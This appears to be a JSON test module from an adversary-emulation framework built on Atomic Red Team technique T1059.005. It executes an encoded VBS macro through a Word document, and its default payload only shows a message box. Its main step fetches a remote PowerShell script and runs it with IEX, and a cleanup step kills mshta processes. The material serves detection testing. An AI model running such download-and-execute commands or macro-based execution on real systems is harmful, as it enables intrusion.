{
  "id": "e8209d5f-e42d-45e6-9c2f-633ac4f1eefa",
  "name": "Encoded VBS code execution",
  "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -\u003e File -\u003e Account -\u003e About Word\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "1ee7c041-adc6-4280-b2cd-9076b1063bb9",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "5f49ea7c-8d0f-467d-afec-c394987431a5",
      "type": "execute-command",
      "data": {
        "command": "Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"}  | % { \"$(Stop-Process $_.ProcessID)\" } | Out-Null\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "b4ba3693-5e8a-406a-aea8-76f6aaf9de44",
      "name": "Check dependency 1/1",
      "description": "The 64-bit version of Microsoft Office must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "98fa17a6-629f-4a69-89dc-d4d3dbac83e2",
      "name": "Resolve dependency 1/1",
      "description": "The 64-bit version of Microsoft Office must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "bb6246e9-59d9-41d8-861f-46c6bd1ac91c",
      "name": "Re-check dependency 1/1",
      "description": "The 64-bit version of Microsoft Office must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "1ee7c041-adc6-4280-b2cd-9076b1063bb9",
      "p": "on-success",
      "o": "5f49ea7c-8d0f-467d-afec-c394987431a5"
    },
    {
      "s": "1ee7c041-adc6-4280-b2cd-9076b1063bb9",
      "p": "on-failure",
      "o": "5f49ea7c-8d0f-467d-afec-c394987431a5"
    },
    {
      "s": "b4ba3693-5e8a-406a-aea8-76f6aaf9de44",
      "p": "on-success",
      "o": "1ee7c041-adc6-4280-b2cd-9076b1063bb9"
    },
    {
      "s": "b4ba3693-5e8a-406a-aea8-76f6aaf9de44",
      "p": "on-failure",
      "o": "98fa17a6-629f-4a69-89dc-d4d3dbac83e2"
    },
    {
      "s": "98fa17a6-629f-4a69-89dc-d4d3dbac83e2",
      "p": "on-success",
      "o": "bb6246e9-59d9-41d8-861f-46c6bd1ac91c"
    },
    {
      "s": "bb6246e9-59d9-41d8-861f-46c6bd1ac91c",
      "p": "on-failure",
      "o": "1ee7c041-adc6-4280-b2cd-9076b1063bb9"
    }
  ],
  "tags": [
    "T1059.005",
    "atomic-red-team"
  ]
}